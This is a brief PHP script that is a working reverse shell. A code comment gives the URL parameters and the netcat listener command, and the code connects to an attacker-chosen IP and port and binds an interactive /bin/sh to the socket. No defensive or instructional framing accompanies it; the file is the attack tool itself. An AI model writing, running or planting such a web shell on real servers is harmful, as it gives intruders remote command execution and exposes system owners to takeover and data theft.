<?php
// Reverse shell on request:  revshell.php?ip=10.0.0.5&port=443   (listener: sudo nc -lvnp 443)
$ip = isset($_GET['ip']) ? $_GET['ip'] : '127.0.0.1';
$port = isset($_GET['port']) ? intval($_GET['port']) : 443;
$sock = @fsockopen($ip, $port);
if (!$sock) { die("connect failed"); }
$proc = proc_open('/bin/sh -i', array(0 => $sock, 1 => $sock, 2 => $sock), $pipes);
?>
